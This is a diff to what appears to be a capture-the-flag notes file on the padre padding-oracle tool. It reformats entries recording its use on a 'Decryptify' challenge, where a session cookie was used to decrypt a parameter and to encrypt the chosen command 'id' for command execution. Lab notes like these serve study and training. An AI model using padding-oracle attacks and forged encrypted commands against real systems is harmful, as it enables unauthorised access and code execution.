@@ -12,7 +12,9 @@ padre -cookie 'PHPSESSID=...; role=...' \
   'P6HqVqxBsuk77Gu7l8M+RrsLU8qI48mSEoqaOYAW1+Y='
 ```
 
-Used on: **Decryptify** - recovered the plaintext command `date +%Y`.
+Used on: **Decryptify**
+
+recovered the plaintext command `date +%Y`.
 
 ### Encrypt a chosen command
 
@@ -22,7 +24,9 @@ padre -cookie 'PHPSESSID=...; role=...' \
   -enc 'id'
 ```
 
-Used on: **Decryptify** - confirmed command execution through the encrypted `date` parameter.
+Used on: **Decryptify**
+
+confirmed command execution through the encrypted `date` parameter.
 
 ## Related
 
